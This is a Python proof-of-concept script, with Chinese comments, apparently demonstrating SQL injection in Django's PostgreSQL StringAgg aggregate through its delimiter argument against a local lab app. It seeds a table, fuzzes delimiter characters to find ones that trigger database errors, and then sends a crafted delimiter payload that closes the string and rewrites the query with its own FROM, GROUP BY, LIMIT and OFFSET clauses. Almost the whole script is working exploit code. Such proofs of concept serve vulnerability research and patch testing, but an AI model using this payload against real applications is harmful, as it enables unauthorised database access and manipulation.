#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Author: H3rmesk1t
@Email: lyj952359549@gmail.com
"""

import os
import django
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "vuln_env.settings")

# 对 Django 版本进行判断, 当版本大于等于 1.7 时, 自动加上下面的语句
if django.VERSION >= (1, 7):
    django.setup()

from vuln_app.models import Info
from django.contrib.postgres.aggregates import StringAgg

# 初始化数据库
def initdb():
    data = [('ZhangSan', 'male'), ('LiSi', 'male'), ('LiNan', 'female'), ('LiMing', 'male'), ('FenHao', 'female')]
    for name, gender in data:
        Info.objects.get_or_create(name=name, gender=gender)

# fuzz
def fuzz():
    symbol_str = "!@#$%^&*()_+=-|\\\"':;?/>.<,{}[]"
    for c in symbol_str:
        results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name',delimiter=c))
        try:
            for e in results:
                pass
        except IndexError:
            pass
        except Exception as err:
            print("[+] 报错信息: ", err)
            print("[+] 漏洞分隔符: ", c)

# exp
def exp():
    """
    注入点证明
    分别设置delimiter为 单引号 二个单引号 二个双引号
    尝试注释后面的内容 ')--
    :return:
    """
    print("[+] 正常的输出: ")
    payload = '-'
    results = Info.objects.all().values('gender').annotate(demoname=StringAgg('name', delimiter=payload))
    for e in results:
        print(e)

    print("[+] 注入后的的输出: ")
    payload = '-\') AS "demoname" FROM "vuln_app_info" GROUP BY "vuln_app_info"."gender" LIMIT 1 OFFSET 1 -- '
    results = Info.objects.all().values('gender').annotate(demoname=StringAgg('name', delimiter=payload))
    for e in results:
        print(e)

if __name__ == '__main__':
    print('[+] Current Django Version: ', end='')
    print(django.VERSION)
    initdb()
    fuzz()
    exp()